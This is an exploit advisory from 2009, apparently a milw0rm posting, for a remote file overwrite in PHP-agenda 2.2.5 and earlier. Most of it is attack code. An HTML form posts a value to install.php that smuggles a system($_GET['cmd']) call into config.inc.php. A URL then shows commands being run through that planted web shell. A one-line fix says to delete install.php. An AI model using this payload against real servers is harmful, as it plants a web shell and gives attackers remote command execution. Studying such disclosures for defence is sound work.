@@ -1,0 +1,71 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: PHP-agenda
+[+] Version: <= 2.2.5
+[+] Website: http://php-agenda.sourceforge.net
+
+[+] Bugs: [A] Remote File Overwriting
+
+[+] Exploitation: Remote
+[+] Date: 10 Apr 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Remote File Overwriting
+
+[-] Risk: hight
+[-] File affected: install.php
+
+This bug allows a guest to overwrite config.inc.php
+inserting PHP code.
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Remote File Overwriting
+
+<html>
+  <head>PHP-agenda <= 2.2.5 - Remote File Overwriting</head>
+  <body>
+    <form action="http://www.site.com/path/install.php" method="post">
+      <input type="text" name="dbhost" size="30" value="'; system($_GET['cmd']); echo '">
+      <input type="submit" value="Exploit!" >
+    </form>
+  </body>
+</head>
+
+To execute commands:
+
+http://www.site.com/path/config.inc.php?cmd=uname -a
+
+
+*************************************************
+
+[+] Fix
+
+You must delete install.php after installation.
+
+
+*************************************************
+
+# milw0rm.com [2009-04-10]
